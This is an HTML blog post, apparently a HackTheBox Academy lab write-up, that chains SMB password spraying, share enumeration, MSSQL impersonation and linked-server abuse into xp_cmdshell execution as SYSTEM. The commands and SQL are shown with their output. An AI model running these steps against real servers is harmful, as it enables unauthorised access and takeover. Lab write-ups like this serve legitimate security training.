@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacking Common Services (Hard) - PixRei Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0f0a;
+            --bg-secondary: #0d120d;
+            --bg-card: #111611;
+            --text-primary: #c8d6c8;
+            --text-secondary: #6b7c6b;
+            --text-muted: #3d4a3d;
+            --accent: #00ff88;
+            --accent-dim: #00cc6a;
+            --accent-glow: rgba(0, 255, 136, 0.15);
+            --border: #1a251a;
+            --htb-green: #9fef00;
+            --thm-red: #ff4444;
+            --easy: #4ade80;
+            --medium: #fbbf24;
+            --hard: #ef4444;
+            --code-bg: #0d1117;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #f0f4f0;
+            --bg-secondary: #e8ece8;
+            --bg-card: #ffffff;
+            --text-primary: #1a251a;
+            --text-secondary: #4a5a4a;
+            --text-muted: #8a9a8a;
+            --accent: #00994d;
+            --accent-dim: #007a3d;
+            --accent-glow: rgba(0, 153, 77, 0.1);
+            --border: #d0dcd0;
+            --code-bg: #f6f8fa;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.8;
+        }
+
+        .grid-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            background-image:
+                linear-gradient(var(--border) 1px, transparent 1px),
+                linear-gradient(90deg, var(--border) 1px, transparent 1px);
+            background-size: 60px 60px;
+            opacity: 0.3;
+        }
+
+        header {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            z-index: 1000;
+            background: rgba(10, 15, 10, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        [data-theme="light"] header {
+            background: rgba(240, 244, 240, 0.9);
+        }
+
+        nav {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .logo::before { content: '> '; opacity: 0.5; }
+
+        .nav-right {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .back-btn {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        .back-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .theme-toggle {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--accent);
+            width: 40px; height: 40px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .theme-toggle:hover { border-color: var(--accent); }
+
+        .article-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 7rem 2rem 4rem;
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .badge.htb { background: rgba(159, 239, 0, 0.2); color: var(--htb-green); }
+        .badge.easy { background: rgba(74, 222, 128, 0.2); color: var(--easy); }
+        .badge.os { background: var(--accent-glow); color: var(--accent); }
+
+        .article-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--text-primary);
+        }
+
+        .article-info {
+            display: flex;
+            gap: 2rem;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap;
+        }
+
+        /* TABLE OF CONTENTS */
+        .toc-box {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 3rem;
+        }
+
+        .toc-heading {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+            display: block;
+        }
+
+        .toc-links {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        .toc-links li { margin-bottom: 0.6rem; }
+        .toc-links li:last-child { margin-bottom: 0; }
+
+        .toc-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.2s;
+        }
+
+        .toc-links a:hover { color: var(--accent); }
+        .toc-links a::before { content: '→ '; opacity: 0.5; }
+
+        /* CONTENT */
+        .content h2 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.4rem;
+            color: var(--accent);
+            margin: 3rem 0 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .content h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.1rem;
+            color: var(--text-primary);
+            margin: 2rem 0 1rem;
+        }
+
+        .content p {
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+        }
+
+        .content ul, .content ol {
+            color: var(--text-secondary);
+            margin-bottom: 1.5rem;
+            padding-left: 1.5rem;
+        }
+
+        .content li { margin-bottom: 0.5rem; }
+        .content strong { color: var(--text-primary); }
+        .content a { color: var(--accent); text-decoration: none; }
+        .content a:hover { text-decoration: underline; }
+
+        /* CODE BLOCKS */
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            overflow: hidden;
+        }
+
+        .code-header {
+            background: var(--bg-card);
+            padding: 0.5rem 1rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .code-lang {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .copy-btn {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .copy-btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+
+        .code-block pre {
+            padding: 1rem;
+            margin: 0;
+            overflow-x: auto;
+        }
+
+        .code-block code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        .content code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85em;
+            background: var(--bg-secondary);
+            padding: 0.15rem 0.4rem;
+            border-radius: 4px;
+            color: var(--accent);
+        }
+
+        .code-block code {
+            background: none;
+            padding: 0;
+        }
+
+        /* INFO BOXES */
+        .info-box {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-left: 4px solid var(--accent);
+            border-radius: 8px;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .info-box.warning { border-left-color: var(--medium); }
+        .info-box.danger { border-left-color: var(--hard); }
+        .info-box.success { border-left-color: var(--easy); }
+
+        .info-box-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+        }
+
+        .info-box.warning .info-box-title { color: var(--medium); }
+        .info-box.danger .info-box-title { color: var(--hard); }
+        .info-box.success .info-box-title { color: var(--easy); }
+        .info-box p { margin-bottom: 0; font-size: 0.9rem; }
+        .info-box ul { margin-bottom: 0; font-size: 0.9rem; }
+
+        /* TAKEAWAYS */
+        .takeaways {
+            background: var(--accent-glow);
+            border: 1px solid var(--accent);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 3rem 0;
+        }
+
+        .takeaways h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+
+        .takeaways ul { margin-bottom: 0; }
+
+        /* NAVIGATION */
+        .article-nav {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border);
+        }
+
+        .nav-link {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            transition: all 0.2s;
+            flex: 1;
+            min-width: 150px;
+        }
+
+        .nav-link:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+          
+        .nav-link.prev { text-align: left; }
+        .nav-link.prev::before { content: none;}
+        .nav-link.next { text-align: right; }
+        .nav-link.next::after { content: ' →'; }
+        .nav-link span {
+            display: block;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-bottom: 0.25rem;
+        }
+
+        footer {
+            padding: 3rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+            margin-top: 4rem;
+        }
+
+        .footer-text {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        @media (max-width: 768px) {
+            .article-title { font-size: 1.8rem; }
+            .article-container { padding: 6rem 1rem 2rem; }
+            .article-nav { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+
+    <header>
+        <nav>
+            <a href="../../index.html" class="logo">PixRei ./blog/ACS-Hard</a>
+            <div class="nav-right">
+                <a href="../index.html" class="back-btn">← All Posts</a>
+                <button class="theme-toggle" id="themeToggle">◐</button>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <article class="article-container">
+            <div class="article-meta">
+                <span class="badge htb">HackTheBox Academy</span>
+                <span class="badge hard" style="background: rgba(239,68,68,0.2); color: var(--hard);">Hard</span>
+                <span class="badge os">🪟 Windows</span>
+            </div>
+
+            <h1 class="article-title">Attacking Common Services</h1>
+
+            <div class="article-info">
+                <span>📅 Jul 13, 2026</span>
+                <span>⏱️ 10 min read</span>
+                <span>🏷️ SMB, MSSQL, Impersonation, Linked Servers</span>
+            </div>
+
+            <div class="toc-box">
+                <span class="toc-heading">// Table of Contents</span>
+                <ul class="toc-links">
+                    <li><a href="#summary">Summary</a></li>
+                    <li><a href="#recon">Reconnaissance</a></li>
+                    <li><a href="#smb">SMB Enumeration & Simon</a></li>
+                    <li><a href="#fiona">Password Discovery — Fiona</a></li>
+                    <li><a href="#mssql">MSSQL Impersonation</a></li>
+                    <li><a href="#linked">Linked Server & RCE</a></li>
+                    <li><a href="#takeaways">Key Takeaways</a></li>
+                </ul>
+            </div>
+
+            <div class="content">
+                <h2 id="summary">Summary</h2>
+                <p>This Hard skill assessment targets an internal Windows server (<code>WIN-HARD</code>) that manages files and hosts a Microsoft SQL Server instance. The attack chains a series of misconfigurations: a weak SMB credential leads to file share access, a password reused in a share exposes a second user, and MSSQL <strong>impersonation privileges</strong> combined with a <strong>self-referencing linked server</strong> ultimately yield SYSTEM-level command execution via <code>xp_cmdshell</code>.</p>
+
+                <div class="info-box">
+                    <div class="info-box-title">💡 Box Info</div>
+                    <p>
+                        <strong>IP:</strong> 10.129.203.10<br>
+                        <strong>OS:</strong> Windows Server 2019 (Build 17763)<br>
+                        <strong>Difficulty:</strong> Hard<br>
+                        <strong>Key Skills:</strong> SMB Enumeration, Password Spraying, MSSQL Impersonation, Linked Server Abuse
+                    </p>
+                </div>
+
+                <h2 id="recon">Reconnaissance</h2>
+                <p>The brief describes an internal server used to manage files and working material, running an unknown database. An Nmap scan confirms the exposed services:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">nmap output</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ Target_Name: WIN-HARD  (NetBIOS/DNS: WIN-HARD)</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">📊 Port Analysis</div>
+                    <ul>
+                        <li><strong>445 (SMB):</strong> File shares — first foothold for user/file enumeration.</li>
+                        <li><strong>1433 (MSSQL):</strong> SQL Server 2019 — the privilege-escalation surface.</li>
+                        <li><strong>3389 (RDP):</strong> Interactive access once valid credentials are found.</li>
+                        <li><strong>Domain = WIN-HARD:</strong> Matches the hostname → standalone server, accounts are local (<code>--local-auth</code>).</li>
+                    </ul>
+                </div>
+
+                <h2 id="smb">SMB Enumeration & Simon</h2>
+                <p>Given the username <code>simon</code>, a password spray against SMB finds a valid credential. Note the <code>(Guest)</code> tag — the server has guest fallback enabled, so this needs verifying, but the credential turns out to be genuine:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>netexec smb 10.129.203.10 -u simon -p pws.list --local-auth --ignore-pw-decoding
+SMB  10.129.203.10  445  WIN-HARD  [+] WIN-HARD\simon:li***ol (Guest)</code></pre>
+                </div>
+
+                <p>With the password confirmed, enumerate the readable shares:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">smbmap</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>smbmap -u simon -p 'liverpool' -H 10.129.203.10
+
+Disk        Permissions   Comment
+----        -----------   -------
+Home        READ ONLY
+IPC$        READ ONLY     Remote IPC</code></pre>
+                </div>
+
+                <p>The <code>Home</code> share contains department folders. Under <code>IT/</code>, each user has a personal directory:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">smbclient</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>smbclient //10.129.203.10/home -U simon
+
+smb: \> ls
+  HR   IT   OPS   Projects
+
+smb: \IT\> ls
+  Fiona   John   Simon
+
+smb: \IT\Simon\> ls
+  random.txt        A       94
+
+smb: \IT\john\> ls
+  information.txt   A      101
+  notes.txt         A      164
+  secrets.txt       A       99</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🔑 First Answer</div>
+                    <p>The file belonging to Simon is <code>random.txt</code>. More importantly, John's folder contains a <code>secrets.txt</code> — a strong signal for the next stage.</p>
+                </div>
+
+                <h2 id="fiona">Password Discovery — Fiona</h2>
+                <p>Enumerating the retrieved files (and continued share access) surfaces a password for the user <code>fiona</code>. Confirm it against SMB:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>netexec smb 10.129.203.10 -u fiona -p creds.txt --local-auth
+SMB  10.129.203.10  445  WIN-HARD  [+] WIN-HARD\fiona:48Ns***Sl</code></pre>
+                </div>
+
+                
+                <h2 id="mssql">MSSQL Impersonation</h2>
+                <p>With Fiona's credentials we authenticate to MSSQL. The critical enumeration step is checking which logins the current user is allowed to <strong>impersonate</strong>:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL — enumerate impersonation</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>SELECT DISTINCT b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+  ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+
+name
+-----
+john
+simon</code></pre>
+                </div>
+
+                <p>Fiona can impersonate <code>john</code>. However, John alone cannot run <code>xp_cmdshell</code> directly on this instance — so we enumerate the registered linked servers:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL — linked servers</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>SELECT srvname, isremote FROM sysservers;
+
+srvname                 isremote
+---------------------   --------
+WINSRV02\SQLEXPRESS            1
+LOCAL.TEST.LINKED.SRV          0</code></pre>
+                </div>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">⚠️ Impersonation vs Linked Servers</div>
+                    <p>These are two <em>different</em> escalation paths. MSSQL refuses a linked-server call made <em>while impersonating</em> ("Linked servers cannot be used under impersonation without a mapping"). The self-referencing <code>LOCAL.TEST.LINKED.SRV</code> (<code>isremote=0</code>) is the interesting one — queries sent through it run in the link's own security context.</p>
+                </div>
+
+                <h2 id="linked">Linked Server & RCE</h2>
+                <p>Sending a query through <code>LOCAL.TEST.LINKED.SRV</code> confirms the link executes as sysadmin:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL — verify context</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>EXECUTE('SELECT @@servername, @@version, system_user,
+         is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV];
+-- is_srvrolemember returns 1 → sysadmin on the far side</code></pre>
+                </div>
+
+                <p><code>xp_cmdshell</code> is disabled by default, so enable it through the link first. Inner single quotes are doubled because the whole statement travels as a string:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL — enable xp_cmdshell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV];
+EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
+EXEC ('sp_configure ''xp_cmdshell'', 1') AT [LOCAL.TEST.LINKED.SRV];
+EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];</code></pre>
+                </div>
+
+                <p>Now command execution works — and the context is <code>nt authority\system</code>:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL — command execution</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
+output
+-------------------
+nt authority\system</code></pre>
+                </div>
+
+                <p>With SYSTEM-level execution, the flag on the Administrator desktop is trivial to read:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL — locate the flag</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>EXEC ('xp_cmdshell ''dir C:\Users\Administrator\Desktop''') AT [LOCAL.TEST.LINKED.SRV];
+
+ Directory of C:\Users\Administrator\Desktop
+ 04/21/2022  04:07 PM   27 flag.txt</code></pre>
+                </div>
+
+                <div class="info-box danger">
+                    <div class="info-box-title">🏆 SYSTEM Compromise</div>
+                    <p>The chain is complete: <strong>simon → SMB files → fiona → impersonate john → linked-server sysadmin → xp_cmdshell as SYSTEM</strong>. Reading <code>flag.txt</code> from the Administrator desktop finishes the assessment.</p>
+                </div>
+
+                <div class="takeaways">
+                    <h3>🎯 Key Takeaways</h3>
+                    <ul>
+                        <li><strong>Guest fallback:</strong> A <code>[+]</code> tagged <code>(Guest)</code> is not proof of a valid credential — verify before trusting it.</li>
+                        <li><strong>Standalone vs domain:</strong> When the domain name equals the hostname, accounts are local — use <code>--local-auth</code>.</li>
+                        <li><strong>MSSQL impersonation:</strong> <code>IMPERSONATE</code> grants are a direct privilege-escalation path; always enumerate them.</li>
+                        <li><strong>Linked servers:</strong> A self-referencing link can run as sysadmin. Impersonation and linked-server calls cannot be combined in one context.</li>
+                        <li><strong>Quote escaping:</strong> Statements sent via <code>EXEC(...) AT [srv]</code> need inner single quotes doubled (<code>''</code>).</li>
+                        <li><strong>xp_cmdshell as SYSTEM:</strong> The SQL service account is often highly privileged — enabling it can mean immediate SYSTEM.</li>
+                    </ul>
+                </div>
+
+                <h3>Tools Used</h3>
+                <ul>
+                    <li><code>nmap</code> — service enumeration</li>
+                    <li><code>netexec</code> — SMB/MSSQL spraying</li>
+                    <li><code>smbmap</code> / <code>smbclient</code> — share access</li>
+                    <li><code>impacket-mssqlclient</code> — MSSQL interaction</li>
+                </ul>
+            </div>
+
+            <nav class="article-nav">
+                <a href="../index.html" class="nav-link prev"><span>Back</span>All Posts</a>
+                <a href="password-attacks.html" class="nav-link next"><span>Next</span>Password Attacks</a>
+            </nav>
+        </article>
+    </main>
+
+    <footer>
+        <p class="footer-text">© 2025 PixRei // Security Research & Writeups</p>
+    </footer>
+
+    <script>
+        const themeToggle = document.getElementById('themeToggle');
+        const html = document.documentElement;
+        function setTheme(theme) {
+            html.setAttribute('data-theme', theme);
+            localStorage.setItem('theme', theme);
+            themeToggle.textContent = theme === 'dark' ? '◐' : '◑';
+        }
+        setTheme(localStorage.getItem('theme') || 'dark');
+        themeToggle.addEventListener('click', () => {
+            setTheme(html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+        });
+        function copyCode(btn) {
+            const code = btn.closest('.code-block').querySelector('code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
